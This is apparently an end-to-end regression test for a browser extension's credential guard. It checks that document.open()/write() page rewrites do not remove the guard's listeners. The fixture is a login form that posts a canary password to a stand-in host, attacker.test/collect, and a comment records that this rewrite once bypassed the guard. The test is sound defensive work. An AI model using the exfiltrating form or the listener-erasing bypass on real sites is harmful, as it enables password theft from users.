/**
 * #1105: a page that rewrites itself with
 * `document.open(); document.write(<login form>); document.close()` must not
 * strip the credential guard.
 *
 * The HTML spec's "document open steps" erase every event listener on the
 * document, its descendants and the window, and the guard registers at
 * document_start, before any page script runs. The guard re-adds its listeners
 * through `persistent_listener.ts`. Both hosts are fake and served by request
 * interception, so every POST is counted at the network boundary.
 */
import { chromium, expect, test, type BrowserContext, type Page, type Worker } from "@playwright/test";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { SUITE_SETTINGS_KEY } from "../../extension/src/shared/storage";
import { clickModalButton, getServiceWorker, waitForCredentialModal, waitForToastText } from "./extension_test_utils";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const extensionPath = process.env.EXTENSION_PATH
  ? path.resolve(process.env.EXTENSION_PATH)
  : path.resolve(__dirname, "..", "..", "extension", "dist");

const LOGIN_URL = "http://victim.test/login";
const ATTACKER_URL = "http://attacker.test/collect";
const CANARY = "canary-password-1105";

test.setTimeout(120_000);

const LOGIN_FORM = `<form id="login" method="post" action="${ATTACKER_URL}">
  <input name="user" value="synthetic@example.invalid">
  <input id="password" name="password" type="password" value="${CANARY}">
  <button id="go" type="submit">Sign in</button>
</form>`;

async function withVictimPage(run: (page: Page, attacker: string[]) => Promise<void>): Promise<void> {
  const profiles = path.resolve(__dirname, "../../test-results/credential-document-open-profiles");
  fs.mkdirSync(profiles, { recursive: true });
  const userDataDir = fs.mkdtempSync(path.join(profiles, "probe-"));
  let context: BrowserContext | null = null;
  try {
    context = await chromium.launchPersistentContext(userDataDir, {
      headless: false,
      timeout: 60_000,
      args: [`--disable-extensions-except=${extensionPath}`, `--load-extension=${extensionPath}`],
    });
    const serviceWorker: Worker = await getServiceWorker(context);
    await expect.poll(() => serviceWorker.evaluate(() => typeof chrome.storage?.local?.set === "function")).toBe(true);
    await serviceWorker.evaluate(async (settingsKey) => {
      await chrome.storage.local.set({
        [settingsKey]: {
          nav: { defaultMode: "smart", debug: false },
          credential: {
            mode: "smart",
            promptOnUntrustedDomain: true,
            promptOnMediumRisk: false,
            mediumRiskThreshold: 100,
            blockHttpPasswordSubmit: false,
            warnOnPaste: true,
            similarity: { enabled: true, maxDistance: 2 },
          },
          logLimit: 300,
        },
      });
    }, SUITE_SETTINGS_KEY);

    const attacker: string[] = [];
    await context.route("http://victim.test/**", (route) =>
      route.fulfill({ contentType: "text/html", body: "<!doctype html><html><body></body></html>" }),
    );
    await context.route("http://attacker.test/**", async (route) => {
      const request = route.request();
      attacker.push(`${request.method()} ${request.url()} ${request.postData() ?? ""}`);
      await route.fulfill({ contentType: "text/html", body: "<p>attacker sink</p>" });
    });

    const page = await context.newPage();
    await page.goto(LOGIN_URL, { waitUntil: "domcontentloaded" });
    // The guard is a document_start content script; let its settings cache prime.
    await page.waitForTimeout(300);
    await run(page, attacker);
  } finally {
    await context?.close();
    fs.rmSync(userDataDir, { recursive: true, force: true });
  }
}

async function expectGuardIntercepts(page: Page, attacker: string[]): Promise<void> {
  await page.click("#go", { noWaitAfter: true });
  await waitForCredentialModal(page);
  await page.waitForTimeout(1_000);
  expect(attacker, "no canary POST before the user decides").toEqual([]);
  await clickModalButton(page, "Cancel");
  await page.waitForTimeout(1_000);
  expect(attacker, "declining sends nothing").toEqual([]);
}

test("control: a login form injected without document.open() is intercepted (#1105) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  await withVictimPage(async (page, attacker) => {
    await page.evaluate((html) => {
      document.body.innerHTML = html;
    }, LOGIN_FORM);
    await expectGuardIntercepts(page, attacker);
  });
});

const REWRITE = (html: string): void => {
  document.open();
  document.write(`<!doctype html><html><body>${html}</body></html>`);
  document.close();
};

test("document.open() + write(login form) + close() keeps the credential guard (#1105) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  // Before the fix this POSTed the canary to the attacker with no prompt.
  await withVictimPage(async (page, attacker) => {
    await page.evaluate(REWRITE, LOGIN_FORM);
    await expect(page.locator("#go")).toBeVisible();
    await expectGuardIntercepts(page, attacker);
  });
});

test("document.open() on an already childless document keeps the credential guard (#1105 review) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  // Task 1 empties the document (the doctype is a child too); task 2 opens it. open() on a childless document
  // erases the listeners but queues only an addedNodes record for the write.
  await withVictimPage(async (page, attacker) => {
    await page.evaluate(() => document.replaceChildren());
    await page.waitForTimeout(100);
    await page.evaluate(REWRITE, LOGIN_FORM);
    await expect(page.locator("#go")).toBeVisible();
    await expectGuardIntercepts(page, attacker);
  });
});

test("a second document.open() keeps the credential guard (#1105 review) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  await withVictimPage(async (page, attacker) => {
    await page.evaluate(REWRITE, "<p>first rewrite</p>");
    await page.waitForTimeout(100);
    await page.evaluate(REWRITE, LOGIN_FORM);
    await expect(page.locator("#go")).toBeVisible();
    await expectGuardIntercepts(page, attacker);
  });
});

test("document.open() keeps the paste warning (#1105) @regression", async () => {
  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
  await withVictimPage(async (page) => {
    await page.evaluate(REWRITE, LOGIN_FORM);
    await page.evaluate(() => {
      document.getElementById("password")!.dispatchEvent(new ClipboardEvent("paste", { bubbles: true }));
    });
    await waitForToastText(page, "You pasted into a password field on an untrusted domain");
  });
});
